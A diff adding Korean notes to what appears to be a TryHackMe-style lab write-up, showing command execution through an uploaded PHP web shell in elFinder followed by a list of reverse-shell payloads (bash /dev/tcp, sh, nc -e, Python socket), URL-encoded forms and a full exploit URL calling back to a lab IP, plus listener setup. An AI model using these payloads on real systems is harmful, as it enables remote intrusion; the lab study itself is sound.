@@ -437,3 +437,86 @@ $
 http://files.lookup.thm/elFinder/php
 
 - 위 경로에 접근해보니 SecSignal.php 파일이 생성되어 있음!
+
+# 브라우저에서 -> http://files.lookup.thm/elFinder/php?c=ls
+
+- 명령어 실행 결과 확인
+
+# 리버스쉘
+
+`/bin/sh -i >& /dev/tcp/10.8.136.212/4444 0>&1` 명령어가 안 먹히는 건 몇 가지 이유가 있을 수 있어요.
+
+---
+
+### 1. PHP `system()` 함수에서 리디렉션(`>&`)를 못쓰는 경우
+
+- PHP `system()` 함수는 단순 쉘 커맨드를 실행하지만, 복잡한 리디렉션 문법은 제한될 수 있어요.
+- `>&` 구문이 shell에서 제대로 인식 안 될 수도 있습니다.
+
+---
+
+### 2. 우회 방법: 명령어를 여러 개로 나누거나 `bash`를 명시적으로 호출
+
+```bash
+# 실패
+/bin/bash -c "bash -i >& /dev/tcp/10.8.136.212/4444 0>&1"
+```
+
+URL 인코딩:
+
+```bash
+# 성공
+/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22
+```
+
+접속 URL:
+
+```
+http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22
+```
+
+---
+
+### 3. `bash` 가 없으면 `sh` 로 시도하기
+
+```
+/bin/sh -c "sh -i >& /dev/tcp/10.8.136.212/4444 0>&1"
+```
+
+---
+
+### 4. `nc` 리버스 쉘도 시도하기 (nc가 설치되어 있으면)
+
+```bash
+# 실패
+nc 10.8.136.212 4444 -e /bin/sh
+```
+
+URL 인코딩
+
+```bash
+# 성공
+nc+10.8.136.212+4444+-e+/bin/sh
+```
+
+---
+
+### 5. `python` 리버스 쉘
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+URL 인코딩은 길어서 툴이나 스크립트로 하세요.
+
+---
+
+### 6. 요약
+
+- `bash` 리디렉션 명령어를 직접 넣는 대신 `/bin/bash -c "명령어"` 형태로 넣어보세요.
+- `nc` 혹은 `python` 리버스쉘도 시도.
+- 리버스 쉘 성공 전에 공격자의 리스너(`nc -lvnp 4444`) 꼭 실행!
+
+---
+
+필요하면 URL 인코딩도 도와줄게요!
